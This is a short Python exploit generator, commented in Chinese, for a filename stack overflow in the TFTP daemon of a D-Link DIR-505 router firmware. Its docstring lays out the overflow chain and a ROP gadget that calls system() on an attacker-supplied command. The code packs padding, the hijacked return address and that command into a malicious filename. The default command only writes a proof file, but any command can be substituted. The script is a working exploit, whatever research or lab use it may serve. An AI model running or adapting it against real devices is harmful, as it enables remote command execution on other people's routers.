#!/usr/bin/env python3
"""DIR-505 v1.10B02 — tftpd 文件名栈溢出 ROP 生成器
溢出链:
  save_upload_file: strcpy(local[30], "/tmp/<filename>")   ← 溢出
  劫持 $ra -> libputil_base + 0x6838:
     0x6838 lw    $t9, GOT(system)
     0x683c addiu $s1, $sp, 0x28
     0x6840 jalr  $t9
     0x6844 move  $a0, $s1          ; system(sp+0x28)
  sp+0x28 处的命令串来自 filename[0x5B]（第二次 strcpy 把 path 复制到 mp 帧）
布局: [0..46]填充 | [47..50]$ra | [51..90]填充 | [91..]命令(自动 NUL 结尾)
"""
import sys, struct

GADGET_OFF = 0x6838

def build(libputil_base, cmd, filler=b'A'):
    ra = libputil_base + GADGET_OFF
    name = filler*47 + struct.pack('>I', ra) + filler*40 + cmd.encode()
    return name

if __name__ == '__main__':
    base = int(sys.argv[1], 0)
    cmd  = sys.argv[2] if len(sys.argv)>2 else "echo ROP_OK > /tmp/rop_proof"
    name = build(base, cmd)
    out = sys.argv[3] if len(sys.argv)>3 else 'rop_fname.hex'
    open(out,'w').write(name.hex())
    print(f"[+] filename len={len(name)}  ra={hex(base+GADGET_OFF)}  cmd={cmd!r}")
    print(f"[+] hex saved to {out}")
